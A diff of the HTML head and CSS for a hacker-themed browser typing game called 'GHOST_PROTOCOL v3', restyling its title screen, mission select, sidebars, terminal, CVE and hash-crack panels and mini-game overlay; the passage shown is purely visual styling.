@@ -2,798 +2,1316 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>GHOST_PROTOCOL</title>
-<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>GHOST_PROTOCOL v3</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
 <style>
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
 :root{
-  --bg:#020408;--bg2:#060d12;--bg3:#040b0f;
-  --green:#00ff88;--g2:#00cc66;--gdim:#003320;--gfaint:#001a10;
-  --cyan:#00e5ff;--cdim:#004455;
-  --red:#ff2244;--rdim:#330008;
-  --amber:#ffaa00;--adim:#332200;
-  --text:#7affb0;--text2:#3a8858;--text3:#163325;
-  --b1:rgba(0,255,136,0.10);--b2:rgba(0,255,136,0.25);
+  --bg:#010306;--bg2:#050c10;--bg3:#030810;
+  --g:#00ff88;--g2:#00cc66;--gd:#002a1a;--gf:#001410;
+  --cy:#00e5ff;--cyd:#003a44;
+  --rd:#ff2244;--rdd:#33000e;
+  --am:#ffaa00;--amd:#332500;
+  --pk:#ff2d78;--pu:#a855f7;
+  --tx:#6effa8;--tx2:#2e7a4a;--tx3:#123020;
+  --b1:rgba(0,255,136,.08);--b2:rgba(0,255,136,.2);--b3:rgba(0,255,136,.35);
   --mono:'Share Tech Mono',monospace;--disp:'Orbitron',monospace;
+  --glow:0 0 20px rgba(0,255,136,.25);--glow2:0 0 40px rgba(0,255,136,.15);
 }
-html,body{height:100%;background:var(--bg);color:var(--text);font-family:var(--mono);overflow:hidden;}
-body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.012) 2px,rgba(0,255,136,0.012) 4px);pointer-events:none;z-index:9999;}
-body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 45%,rgba(0,0,0,0.82) 100%);pointer-events:none;z-index:9998;}
-#bg-canvas{position:fixed;inset:0;z-index:0;opacity:0.05;}
+html,body{height:100%;background:var(--bg);color:var(--tx);font-family:var(--mono);overflow:hidden;user-select:none;}
+::selection{background:rgba(0,255,136,.2);}
+/* scanlines + vignette */
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.008) 2px,rgba(0,255,136,.008) 4px);pointer-events:none;z-index:9998;}
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 80% at 50% 50%,transparent 40%,rgba(0,0,0,.75) 100%);pointer-events:none;z-index:9997;}
+canvas#bgc{position:fixed;inset:0;z-index:0;}
 
-/* ── SCREENS ── */
 .screen{position:fixed;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;}
 .screen.hide{display:none;}
 
-/* ── TITLE ── */
+/* ═══ TITLE ═══ */
 #s-title{background:var(--bg);}
-.logo{font-family:var(--disp);font-size:clamp(38px,9vw,88px);font-weight:900;letter-spacing:0.1em;color:var(--green);text-shadow:0 0 40px rgba(0,255,136,0.5),0 0 100px rgba(0,255,136,0.12);animation:flk 5s ease infinite;}
-.logo-sub{font-family:var(--disp);font-size:clamp(8px,1.4vw,11px);letter-spacing:0.55em;color:var(--text2);margin-top:0.3rem;}
-@keyframes flk{0%,93%,95%,97%,100%{opacity:1;}94%,96%{opacity:0.4;}}
-.t-divider{width:90px;height:1px;background:var(--b2);margin:1.75rem 0;}
-.tagline{font-size:12px;color:var(--text2);letter-spacing:0.1em;text-align:center;line-height:2.2;margin-bottom:2rem;}
-.tagline b{color:var(--green);font-weight:normal;}
-.play-btn{font-family:var(--disp);font-size:12px;font-weight:700;letter-spacing:0.35em;background:transparent;border:1px solid var(--g2);color:var(--green);padding:15px 50px;cursor:pointer;transition:all 0.2s;box-shadow:0 0 18px rgba(0,255,136,0.1);}
-.play-btn:hover{background:rgba(0,255,136,0.07);box-shadow:0 0 32px rgba(0,255,136,0.22);}
-.credit{font-size:9px;letter-spacing:0.25em;color:var(--text3);margin-top:2rem;}
+.logo-wrap{position:relative;text-align:center;}
+.logo{font-family:var(--disp);font-size:clamp(36px,9vw,96px);font-weight:900;letter-spacing:.08em;
+  background:linear-gradient(135deg,#00ff88 0%,#00e5ff 50%,#00ff88 100%);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  animation:flk 6s ease infinite,logopulse 3s ease infinite;}
+.logo-line{position:absolute;bottom:-4px;left:10%;right:10%;height:1px;background:linear-gradient(90deg,transparent,var(--g),var(--cy),var(--g),transparent);}
+@keyframes flk{0%,90%,92%,94%,100%{opacity:1;}91%,93%{opacity:.3;}}
+@keyframes logopulse{0%,100%{filter:drop-shadow(0 0 20px rgba(0,255,136,.4));}50%{filter:drop-shadow(0 0 40px rgba(0,229,255,.5));}}
+.logo-sub{font-family:var(--disp);font-size:clamp(7px,1.2vw,10px);letter-spacing:.55em;color:var(--tx2);margin-top:.5rem;text-transform:uppercase;}
+.hdiv{width:120px;height:1px;background:linear-gradient(90deg,transparent,var(--b3),transparent);margin:1.8rem 0;}
+.tagline{font-size:11.5px;color:var(--tx2);letter-spacing:.07em;text-align:center;line-height:2.3;margin-bottom:1.6rem;max-width:500px;}
+.tagline b{color:var(--g);font-weight:normal;}
+.play-btn{font-family:var(--disp);font-size:11px;font-weight:700;letter-spacing:.35em;background:transparent;
+  border:1px solid var(--g2);color:var(--g);padding:14px 52px;cursor:pointer;transition:all .25s;
+  position:relative;overflow:hidden;text-transform:uppercase;}
+.play-btn::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,transparent 40%,rgba(0,255,136,.06));opacity:0;transition:opacity .25s;}
+.play-btn:hover{border-color:var(--g);box-shadow:0 0 30px rgba(0,255,136,.2),inset 0 0 20px rgba(0,255,136,.05);}
+.play-btn:hover::before{opacity:1;}
+/* mission select */
+#ms{display:none;flex-direction:column;align-items:center;gap:6px;margin-top:1.3rem;width:min(600px,94vw);}
+#ms.show{display:flex;}
+.ms-hd{font-family:var(--disp);font-size:7.5px;letter-spacing:.35em;color:var(--tx3);text-align:center;margin-bottom:.3rem;}
+.ms-card{width:100%;display:flex;align-items:center;gap:.9rem;padding:10px 14px;
+  border:1px solid var(--b1);background:linear-gradient(90deg,var(--bg2),rgba(5,12,16,.5));
+  cursor:pointer;transition:all .15s;position:relative;overflow:hidden;}
+.ms-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:2px;background:var(--g);transform:scaleY(0);transition:transform .2s;}
+.ms-card:hover:not(.locked)::before{transform:scaleY(1);}
+.ms-card:hover:not(.locked){border-color:rgba(0,255,136,.25);background:linear-gradient(90deg,rgba(0,255,136,.03),var(--bg2));}
+.ms-card.locked{opacity:.25;cursor:not-allowed;}
+.ms-card.done{border-color:var(--gd);background:var(--gf);}
+.ms-card.done::before{transform:scaleY(1);background:var(--g2);}
+.ms-n{font-family:var(--disp);font-size:18px;font-weight:900;color:var(--tx3);width:28px;flex-shrink:0;line-height:1;}
+.ms-card:not(.locked) .ms-n{color:var(--g);}
+.ms-card.done .ms-n{color:var(--g2);}
+.ms-i{flex:1;}
+.ms-nm{font-size:10px;letter-spacing:.14em;color:var(--tx);margin-bottom:2px;}
+.ms-card.locked .ms-nm{color:var(--tx3);}
+.ms-ds{font-size:8.5px;color:var(--tx3);line-height:1.55;}
+.ms-r{display:flex;flex-direction:column;align-items:flex-end;gap:5px;}
+.ms-df{font-family:var(--disp);font-size:7px;letter-spacing:.2em;padding:2px 8px;border:1px solid;text-transform:uppercase;}
+.ms-df.d1{border-color:var(--gd);color:var(--g2);}
+.ms-df.d2{border-color:var(--amd);color:var(--am);}
+.ms-df.d3{border-color:rgba(255,34,68,.3);color:var(--rd);}
+.ms-df.d4{border-color:rgba(168,85,247,.3);color:var(--pu);}
+.ms-ok{font-size:9px;color:var(--g2);}
+.credit{font-size:8px;letter-spacing:.2em;color:var(--tx3);margin-top:1.6rem;text-align:center;line-height:2;}
 
-/* ── GAME LAYOUT ── */
+/* ═══ GAME LAYOUT ═══ */
 #s-game{flex-direction:row;align-items:stretch;background:var(--bg);padding:0;}
 
 /* LEFT SIDEBAR */
-#sidebar{width:200px;flex-shrink:0;background:var(--bg3);border-right:1px solid var(--b1);display:flex;flex-direction:column;z-index:2;overflow:hidden;}
-.sb-hdr{font-family:var(--disp);font-size:7px;letter-spacing:0.3em;color:var(--text3);padding:0.55rem 0.85rem;border-bottom:1px solid var(--b1);background:var(--bg2);text-transform:uppercase;}
-.sb-hdr span{color:var(--g2);}
+#sb{width:192px;flex-shrink:0;background:var(--bg3);border-right:1px solid var(--b1);
+  display:flex;flex-direction:column;z-index:2;overflow:hidden;}
+.sh{font-family:var(--disp);font-size:6.5px;letter-spacing:.3em;color:var(--tx3);
+  padding:.4rem .7rem;border-bottom:1px solid var(--b1);background:rgba(3,8,16,.8);
+  text-transform:uppercase;display:flex;justify-content:space-between;align-items:center;}
+.sh span{color:var(--g2);}
+/* attack chain */
+#mnodes{padding:.45rem .5rem;overflow-y:auto;max-height:200px;}
+.mn{display:flex;align-items:center;gap:5px;padding:4px 6px;margin-bottom:2px;border:1px solid var(--b1);transition:all .3s;position:relative;}
+.mn.done{border-color:var(--gd);background:var(--gf);}
+.mn.active{border-color:var(--g2);background:rgba(0,255,136,.02);box-shadow:inset 2px 0 0 var(--g2);}
+.mn.locked{opacity:.2;}
+.ml{font-size:7.5px;letter-spacing:.05em;color:var(--tx2);}
+.ml.a{color:var(--g);}
+.ml.d{color:var(--g2);}
+.mc{width:1px;height:5px;background:var(--b2);margin:0 0 2px 9px;}
+.ms2{margin-left:auto;font-size:7px;}
+/* stats */
+#sstats{padding:.55rem .65rem;border-top:1px solid var(--b1);}
+.sst{margin-bottom:7px;}
+.ssh{display:flex;justify-content:space-between;font-size:7.5px;letter-spacing:.09em;color:var(--tx2);margin-bottom:2px;}
+.sv{color:var(--g);font-family:var(--disp);}
+.strk{height:3px;background:rgba(255,255,255,.06);border-radius:0;overflow:hidden;}
+.sf{height:100%;transition:width .6s cubic-bezier(.4,0,.2,1);}
+.sf.g{background:linear-gradient(90deg,var(--gd),var(--g));}
+.sf.a{background:linear-gradient(90deg,var(--amd),var(--am));}
+.sf.c{background:linear-gradient(90deg,var(--cyd),var(--cy));}
+.sf.r{background:linear-gradient(90deg,var(--rdd),var(--rd));}
+/* toolkit */
+#stools{padding:.55rem .65rem;border-top:1px solid var(--b1);}
+.ti{display:flex;align-items:center;gap:5px;padding:2px 0;font-size:7.5px;color:var(--tx3);border-bottom:1px solid var(--b1);}
+.ti:last-child{border:none;}
+.ti.on{color:var(--g);}
+.ti.on .ticon{filter:none;}
+.ticon{font-size:10px;width:13px;filter:grayscale(1) opacity(.4);}
+/* credential vault */
+#screds{padding:.55rem .65rem;border-top:1px solid var(--b1);max-height:110px;overflow-y:auto;}
+#screds::-webkit-scrollbar{width:2px;}
+#screds::-webkit-scrollbar-thumb{background:var(--gd);}
+.cred-item{display:flex;align-items:center;gap:4px;padding:2px 0;border-bottom:1px solid var(--b1);font-size:7.5px;}
+.cred-item:last-child{border:none;}
+.cred-type{color:var(--am);font-size:7px;min-width:28px;}
+.cred-val{color:var(--tx);word-break:break-all;flex:1;}
+/* IDS */
+#sids{padding:.55rem .65rem;border-top:1px solid var(--b1);margin-top:auto;}
+.idslbl{font-family:var(--disp);font-size:6.5px;letter-spacing:.18em;color:var(--tx3);margin-bottom:5px;}
+#idstrk{height:6px;background:rgba(255,255,255,.06);overflow:hidden;position:relative;}
+#idsfill{height:100%;background:var(--g);transition:width .5s,background .5s;position:relative;}
+#idsfill::after{content:'';position:absolute;right:0;top:0;bottom:0;width:4px;background:white;opacity:.4;filter:blur(2px);}
+#idspct{font-size:10px;color:var(--g);margin-top:3px;text-align:right;transition:color .5s;font-family:var(--disp);}
 
-#mission-nodes{padding:0.6rem;}
-.mnode{display:flex;align-items:center;gap:7px;padding:6px 7px;margin-bottom:2px;border:1px solid var(--b1);transition:all 0.3s;}
-.mnode.done{border-color:var(--gdim);background:var(--gfaint);}
-.mnode.active{border-color:var(--g2);background:rgba(0,255,136,0.04);box-shadow:0 0 8px rgba(0,255,136,0.07);}
-.mnode.locked{opacity:0.3;}
-.mnode-icon{font-size:11px;width:18px;flex-shrink:0;}
-.mnode-lbl{font-size:8px;letter-spacing:0.08em;color:var(--text2);}
-.mnode-lbl.a{color:var(--green);}
-.mnode-lbl.d{color:var(--g2);}
-.mnode-conn{width:1px;height:8px;background:var(--b2);margin:0 0 2px 16px;}
-.mnode-st{margin-left:auto;font-size:8px;}
-
-#sb-stats{padding:0.75rem;border-top:1px solid var(--b1);}
-.sb-stat{margin-bottom:9px;}
-.sb-sh{display:flex;justify-content:space-between;font-size:8px;letter-spacing:0.12em;color:var(--text2);margin-bottom:3px;text-transform:uppercase;}
-.sb-v{color:var(--green);}
-.sb-trk{height:2px;background:var(--text3);}
-.sb-fill{height:100%;transition:width 0.5s ease;}
-.sb-fill.g{background:linear-gradient(90deg,var(--gdim),var(--green));}
-.sb-fill.a{background:linear-gradient(90deg,var(--adim),var(--amber));}
-.sb-fill.c{background:linear-gradient(90deg,var(--cdim),var(--cyan));}
-
-#sb-ids{padding:0.75rem;border-top:1px solid var(--b1);margin-top:auto;}
-.ids-lbl{font-family:var(--disp);font-size:7px;letter-spacing:0.2em;color:var(--text3);margin-bottom:5px;text-transform:uppercase;}
-#ids-track{height:6px;background:var(--text3);overflow:hidden;}
-#ids-fill{height:100%;background:var(--green);transition:width 0.5s,background 0.5s;box-shadow:0 0 5px var(--green);}
-#ids-pct{font-size:10px;color:var(--green);margin-top:3px;text-align:right;transition:color 0.5s;}
-
-/* ── CENTER TERMINAL ── */
-#terminal-wrap{flex:1;display:flex;flex-direction:column;overflow:hidden;position:relative;}
-
-#top-bar{display:flex;align-items:center;gap:0.8rem;background:rgba(4,11,15,0.95);border-bottom:1px solid var(--b1);padding:0 1rem;height:38px;flex-shrink:0;z-index:3;}
-#tb-logo{font-family:var(--disp);font-size:9px;font-weight:700;letter-spacing:0.3em;color:var(--green);text-shadow:0 0 8px rgba(0,255,136,0.4);}
-.tb-sep{color:var(--text3);font-size:10px;}
-#tb-loc{font-size:9px;color:var(--text2);letter-spacing:0.15em;}
-#tb-time{margin-left:auto;font-size:9px;color:var(--text2);}
-#tb-badge{font-size:8px;letter-spacing:0.2em;padding:2px 9px;border:1px solid;text-transform:uppercase;transition:all 0.3s;}
-#tb-badge.low{border-color:var(--gdim);color:var(--g2);}
-#tb-badge.med{border-color:var(--adim);color:var(--amber);animation:bdg 1.5s ease infinite;}
-#tb-badge.hi{border-color:var(--rdim);color:var(--red);animation:bdg 0.7s ease infinite;}
-@keyframes bdg{0%,100%{opacity:1;}50%{opacity:0.4;}}
-
-#term-out{flex:1;overflow-y:auto;padding:1rem 1.25rem;scroll-behavior:smooth;}
-#term-out::-webkit-scrollbar{width:2px;}
-#term-out::-webkit-scrollbar-thumb{background:var(--gdim);}
-
-.tl{line-height:1.85;font-size:12.5px;animation:tla 0.15s ease;}
+/* ═══ CENTER ═══ */
+#tw{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0;}
+#topbar{display:flex;align-items:center;gap:.6rem;background:rgba(3,8,16,.98);
+  border-bottom:1px solid var(--b1);padding:0 .9rem;height:36px;flex-shrink:0;z-index:3;}
+#tbl{font-family:var(--disp);font-size:8px;font-weight:700;letter-spacing:.3em;color:var(--g);
+  text-shadow:0 0 10px rgba(0,255,136,.4);}
+.tbsep{color:var(--tx3);font-size:10px;}
+#tbloc{font-size:8px;color:var(--tx2);letter-spacing:.1em;}
+#tbph{font-size:7.5px;letter-spacing:.12em;padding:2px 6px;border:1px solid var(--b1);color:var(--tx3);}
+#tbbdg{font-size:7px;letter-spacing:.2em;padding:2px 8px;border:1px solid;text-transform:uppercase;transition:all .3s;margin-left:auto;}
+#tbbdg.low{border-color:var(--gd);color:var(--g2);}
+#tbbdg.med{border-color:var(--amd);color:var(--am);animation:bdg 1.5s ease infinite;}
+#tbbdg.hi{border-color:var(--rdd);color:var(--rd);animation:bdg .7s ease infinite;}
+@keyframes bdg{0%,100%{opacity:1;}50%{opacity:.3;}}
+#tbtime{font-family:var(--disp);font-size:8px;color:var(--tx2);}
+/* terminal output */
+#tout{flex:1;overflow-y:auto;padding:.75rem 1rem;scroll-behavior:smooth;}
+#tout::-webkit-scrollbar{width:2px;}
+#tout::-webkit-scrollbar-thumb{background:var(--gd);}
+.tl{line-height:1.75;font-size:12px;animation:tla .1s ease;}
 @keyframes tla{from{opacity:0;}to{opacity:1;}}
-.t-sys{color:var(--text3);font-size:11px;}
-.t-ok{color:var(--green);text-shadow:0 0 6px rgba(0,255,136,0.35);}
-.t-err{color:var(--red);}
-.t-warn{color:var(--amber);}
-.t-story{color:var(--text2);font-size:13px;line-height:1.75;margin:0.2rem 0;}
-.t-npc{color:var(--cyan);font-size:12.5px;}
-.t-player{color:var(--green);font-size:12.5px;}
-.t-hdr{font-family:var(--disp);font-size:9px;letter-spacing:0.3em;color:var(--green);border-bottom:1px solid var(--b1);padding-bottom:4px;margin:0.85rem 0 0.35rem;}
-.t-div{color:var(--text3);font-size:11px;margin:0.15rem 0;}
-
-/* ── BOTTOM BAR ── */
-#bottom-bar{flex-shrink:0;border-top:1px solid var(--b2);background:rgba(4,11,15,0.97);z-index:3;}
-
-/* choices */
-#choices{display:none;flex-wrap:wrap;gap:5px;padding:0.6rem 1.25rem 0;}
+.t-sys{color:var(--tx3);font-size:10.5px;}
+.t-ok{color:var(--g);}
+.t-err{color:var(--rd);}
+.t-warn{color:var(--am);}
+.t-info{color:var(--cy);font-size:11px;}
+.t-story{color:var(--tx2);font-size:12.5px;line-height:1.8;}
+.t-npc{color:var(--cy);font-size:12px;}
+.t-player{color:var(--g);font-size:12px;}
+.t-hdr{font-family:var(--disp);font-size:8px;letter-spacing:.3em;color:var(--g);
+  border-bottom:1px solid var(--b1);padding-bottom:3px;margin:.8rem 0 .3rem;}
+.t-scan{color:var(--cy);font-size:10.5px;font-family:var(--mono);}
+.t-vuln{color:var(--rd);font-size:10.5px;}
+.t-loot{color:var(--am);font-size:10.5px;}
+.t-code{color:rgba(255,170,0,.75);font-size:11px;padding-left:1rem;font-family:var(--mono);}
+.t-cve{display:inline-flex;align-items:center;gap:4px;font-size:9px;font-family:var(--disp);
+  letter-spacing:.1em;padding:1px 6px;border:1px solid var(--rdd);color:var(--rd);margin:0 2px;}
+.t-tool{display:inline-flex;align-items:center;gap:4px;font-size:9px;font-family:var(--disp);
+  letter-spacing:.1em;padding:1px 6px;border:1px solid var(--gd);color:var(--g2);margin:0 2px;}
+/* bottom bar */
+#bb{flex-shrink:0;border-top:1px solid var(--b2);background:rgba(3,8,16,.99);z-index:3;}
+#choices{display:none;flex-wrap:wrap;gap:4px;padding:.45rem 1rem 0;}
 #choices.show{display:flex;}
-.choice{font-family:var(--mono);font-size:9px;letter-spacing:0.12em;background:transparent;border:1px solid var(--b2);color:var(--text2);padding:6px 14px;cursor:pointer;text-transform:uppercase;transition:all 0.15s;}
-.choice:hover{border-color:var(--green);color:var(--green);background:rgba(0,255,136,0.05);}
-.choice.locked{border-color:var(--text3);color:var(--text3);cursor:default;}
+.ch{font-family:var(--mono);font-size:8.5px;letter-spacing:.1em;background:transparent;
+  border:1px solid var(--b2);color:var(--tx2);padding:5px 12px;cursor:pointer;
+  text-transform:uppercase;transition:all .12s;position:relative;overflow:hidden;}
+.ch::before{content:'';position:absolute;left:-100%;top:0;bottom:0;width:100%;
+  background:linear-gradient(90deg,transparent,rgba(0,255,136,.06),transparent);transition:left .3s;}
+.ch:hover{border-color:var(--g);color:var(--g);}
+.ch:hover::before{left:100%;}
+#insec{padding:.4rem 1rem .45rem;display:flex;align-items:center;gap:.4rem;}
+#inpfx{font-size:12px;color:var(--g2);white-space:nowrap;flex-shrink:0;}
+#cmd{flex:1;background:transparent;border:none;border-bottom:1px solid var(--g2);
+  outline:none;color:var(--g);font-family:var(--mono);font-size:13px;
+  caret-color:var(--g);padding:2px 4px;letter-spacing:.03em;}
+#cmd::placeholder{color:var(--tx3);}
+#cmd:focus{border-bottom-color:var(--g);}
+#cmd:disabled{opacity:.15;cursor:not-allowed;}
+#hintbar{display:flex;align-items:center;padding:2px 1rem .38rem;border-top:1px solid var(--b1);}
+#hinttxt{font-size:8px;color:var(--tx3);letter-spacing:.1em;flex:1;}
+#hinttxt span{color:var(--am);}
+#wpmtxt{font-size:8px;color:var(--tx3);}
+#wpmtxt span{color:var(--g2);}
 
-/* THE ACTUAL INPUT — simple, visible, works everywhere */
-#input-section{padding:0.5rem 1.25rem 0.6rem;display:flex;align-items:center;gap:0.5rem;}
-#input-prefix{font-size:13px;color:var(--g2);white-space:nowrap;flex-shrink:0;}
-#cmd-input{
-  flex:1;
-  background:transparent;
-  border:none;
-  border-bottom:1px solid var(--g2);
-  outline:none;
-  color:var(--green);
-  font-family:var(--mono);
-  font-size:14px;
-  caret-color:var(--green);
-  padding:2px 4px;
-  letter-spacing:0.05em;
-}
-#cmd-input::placeholder{color:var(--text3);}
-#cmd-input:focus{border-bottom-color:var(--green);box-shadow:0 2px 8px -2px rgba(0,255,136,0.3);}
-#cmd-input:disabled{opacity:0.3;cursor:not-allowed;}
+/* ═══ RIGHT PANEL ═══ */
+#rp{width:195px;flex-shrink:0;background:var(--bg3);border-left:1px solid var(--b1);
+  display:flex;flex-direction:column;overflow:hidden;}
+#netc{width:100%;height:80px;display:block;}
+/* CVE detail panel */
+#cvepanel{padding:.5rem .6rem;border-bottom:1px solid var(--b1);flex-shrink:0;}
+.cve-tag{font-family:var(--disp);font-size:8px;letter-spacing:.1em;color:var(--rd);
+  border:1px solid var(--rdd);padding:1px 5px;margin-bottom:4px;display:inline-block;}
+.cve-score{font-size:7.5px;color:var(--tx3);margin-bottom:3px;}
+.cve-score span{color:var(--am);}
+.cve-desc{font-size:7.5px;color:var(--tx2);line-height:1.6;}
+/* target intel */
+#tgtpanel{padding:.5rem .6rem;border-bottom:1px solid var(--b1);flex-shrink:0;}
+.tprow{display:flex;justify-content:space-between;font-size:7.5px;padding:2px 0;border-bottom:1px solid var(--b1);}
+.tprow:last-child{border:none;}
+.tpk{color:var(--tx3);}
+.tpv{color:var(--tx2);}
+.tpv.f{color:var(--g);}
+.tpv.v{color:var(--rd);}
+/* hashcrack panel */
+#crackpanel{padding:.5rem .6rem;border-bottom:1px solid var(--b1);display:none;}
+#crackpanel.show{display:block;}
+.cp-lbl{font-family:var(--disp);font-size:6.5px;letter-spacing:.2em;color:var(--tx3);margin-bottom:4px;}
+.cp-hash{font-size:7px;color:var(--am);word-break:break-all;margin-bottom:3px;font-family:var(--mono);}
+#cp-bar-wrap{height:3px;background:rgba(255,255,255,.06);margin-bottom:3px;}
+#cp-bar{height:100%;background:linear-gradient(90deg,var(--am),var(--rd));transition:width .5s;}
+.cp-status{font-size:7.5px;color:var(--tx2);}
+.cp-status span{color:var(--g);}
+/* log */
+#logpanel{flex:1;overflow-y:auto;padding:.3rem .5rem;}
+#logpanel::-webkit-scrollbar{width:2px;}
+#logpanel::-webkit-scrollbar-thumb{background:var(--gd);}
+.le{font-size:8px;line-height:1.75;border-bottom:1px solid var(--b1);padding:2px 0;animation:tla .2s ease;}
+.lt{color:var(--tx3);}
+.lm{color:var(--tx2);}
+.lok{color:var(--g);}
+.lwn{color:var(--am);}
+.ler{color:var(--rd);}
 
-#hint-bar{display:flex;align-items:center;padding:2px 1.25rem 0.5rem;border-top:1px solid var(--b1);}
-#hint-txt{font-size:8.5px;color:var(--text3);letter-spacing:0.12em;flex:1;}
-#hint-txt span{color:var(--amber);}
-#wpm-txt{font-size:8.5px;color:var(--text3);letter-spacing:0.15em;}
-#wpm-txt span{color:var(--g2);}
-
-/* ── RIGHT LOG ── */
-#log-panel{width:175px;flex-shrink:0;background:var(--bg3);border-left:1px solid var(--b1);display:flex;flex-direction:column;overflow:hidden;}
-#log-out{flex:1;overflow-y:auto;padding:0.4rem 0.6rem;}
-#log-out::-webkit-scrollbar{width:2px;}
-#log-out::-webkit-scrollbar-thumb{background:var(--gdim);}
-.log-e{font-size:8.5px;line-height:1.8;border-bottom:1px solid var(--b1);padding:2px 0;animation:tla 0.2s ease;}
-.log-t{color:var(--gdim);}
-.log-m{color:var(--text2);}
-.log-ok{color:var(--green);}
-.log-wn{color:var(--amber);}
-.log-er{color:var(--red);}
-
-/* ── MINI-GAME ── */
-#mg{display:none;position:fixed;inset:0;z-index:500;background:rgba(2,4,8,0.96);align-items:center;justify-content:center;flex-direction:column;gap:1.25rem;}
+/* ═══ MINI-GAME ═══ */
+#mg{display:none;position:fixed;inset:0;z-index:500;background:rgba(1,3,6,.97);
+  align-items:center;justify-content:center;flex-direction:column;gap:.9rem;}
 #mg.show{display:flex;}
-#mg-title{font-family:var(--disp);font-size:11px;letter-spacing:0.4em;color:var(--green);text-shadow:0 0 18px rgba(0,255,136,0.5);}
-#mg-box{width:min(540px,92vw);background:var(--bg2);border:1px solid var(--b2);padding:1.4rem;}
-#mg-inst{font-size:11px;color:var(--text2);margin-bottom:0.85rem;line-height:1.7;}
-#mg-prompt{font-family:var(--mono);font-size:14px;letter-spacing:0.05em;line-height:2.1;margin-bottom:0.9rem;word-break:break-all;min-height:28px;}
-#mg-input{
-  width:100%;
-  background:rgba(0,0,0,0.5);
-  border:1px solid var(--b2);
-  color:var(--green);
-  font-family:var(--mono);
-  font-size:13px;
-  padding:9px 12px;
-  outline:none;
-  caret-color:var(--green);
-}
-#mg-input:focus{border-color:var(--g2);}
-#mg-input.err{border-color:var(--red);}
-#mg-input.ok2{border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.2);}
-#mg-meta{display:flex;justify-content:space-between;align-items:center;margin-top:0.55rem;}
-#mg-pbar{width:160px;height:2px;background:var(--text3);}
-#mg-pfill{height:100%;background:var(--green);transition:width 0.3s;}
-#mg-timer{font-size:10px;color:var(--amber);}
-#mg-wpm-txt{font-size:10px;color:var(--text2);}
+#mghead{display:flex;align-items:center;gap:1rem;}
+#mgtitle{font-family:var(--disp);font-size:9.5px;letter-spacing:.4em;color:var(--g);
+  text-shadow:0 0 15px rgba(0,255,136,.4);}
+#mgph{font-family:var(--disp);font-size:7px;letter-spacing:.22em;padding:3px 10px;
+  border:1px solid var(--gd);color:var(--g2);}
+#mgbox{width:min(620px,95vw);background:linear-gradient(135deg,var(--bg2),var(--bg3));
+  border:1px solid var(--b2);padding:1.25rem;box-shadow:0 0 40px rgba(0,255,136,.06);}
+/* CVE context box */
+#mgctx{font-size:10.5px;color:var(--tx3);margin-bottom:.6rem;line-height:1.65;
+  border-left:2px solid var(--gd);padding:.4rem .6rem;font-style:italic;
+  background:rgba(0,255,136,.02);}
+#mginst{font-size:11px;color:var(--tx2);margin-bottom:.7rem;line-height:1.65;}
+/* prompt with underline cursor */
+#mgprompt{font-family:var(--mono);font-size:14px;letter-spacing:.04em;line-height:2.2;
+  margin-bottom:.8rem;word-break:break-all;min-height:28px;}
+#mgprompt .co{color:var(--g);}
+#mgprompt .cb{color:var(--rd);text-decoration:underline wavy var(--rd);}
+#mgprompt .cn{color:var(--g);border-bottom:2px solid var(--g);padding-bottom:1px;}
+#mgprompt .cp{color:var(--tx3);}
+#mginput{width:100%;background:rgba(0,0,0,.6);border:1px solid var(--b1);
+  color:var(--g);font-family:var(--mono);font-size:13px;padding:8px 12px;
+  outline:none;caret-color:var(--g);transition:border-color .15s;}
+#mginput:focus{border-color:var(--g2);}
+#mginput.err{border-color:var(--rd);box-shadow:inset 0 0 8px rgba(255,34,68,.06);}
+#mginput.ok2{border-color:var(--g);}
+#mgmeta{display:flex;justify-content:space-between;align-items:center;margin-top:.5rem;}
+#mgpbarwrap{display:flex;align-items:center;gap:.5rem;}
+#mgpbar{width:130px;height:2px;background:rgba(255,255,255,.06);}
+#mgpfill{height:100%;background:linear-gradient(90deg,var(--g2),var(--g));transition:width .3s;}
+#mgsteps{font-size:8.5px;color:var(--tx3);}
+#mgtimer{font-size:11px;color:var(--am);font-family:var(--disp);}
+#mgwpm{font-size:8.5px;color:var(--tx2);}
+/* fail overlay */
+#mgfail{display:none;text-align:center;padding:.85rem 0 .4rem;border-top:1px solid var(--b1);margin-top:.75rem;}
+#mgfail.show{display:block;}
+.ftitle{font-family:var(--disp);font-size:15px;letter-spacing:.2em;color:var(--rd);
+  margin-bottom:.35rem;text-shadow:0 0 15px rgba(255,34,68,.4);}
+.fmsg{font-size:10.5px;color:var(--tx2);line-height:1.75;margin-bottom:.8rem;}
+.fbtns{display:flex;gap:8px;justify-content:center;}
+.rbtn{font-family:var(--disp);font-size:9px;letter-spacing:.25em;background:transparent;
+  border:1px solid var(--rd);color:var(--rd);padding:9px 22px;cursor:pointer;transition:all .15s;}
+.rbtn:hover{background:rgba(255,34,68,.06);}
+.mbtn{font-family:var(--disp);font-size:9px;letter-spacing:.25em;background:transparent;
+  border:1px solid var(--tx3);color:var(--tx2);padding:9px 22px;cursor:pointer;transition:all .15s;}
+.mbtn:hover{border-color:var(--tx2);}
 
-/* ── NOTIFS ── */
-#notifs{position:fixed;top:46px;right:185px;z-index:400;display:flex;flex-direction:column;gap:5px;pointer-events:none;}
-.notif{font-family:var(--mono);font-size:9px;letter-spacing:0.15em;text-transform:uppercase;padding:5px 11px;border-left:2px solid;animation:nsl 0.3s ease;}
-.notif.ok{background:rgba(0,255,136,0.05);border-color:var(--green);color:var(--green);}
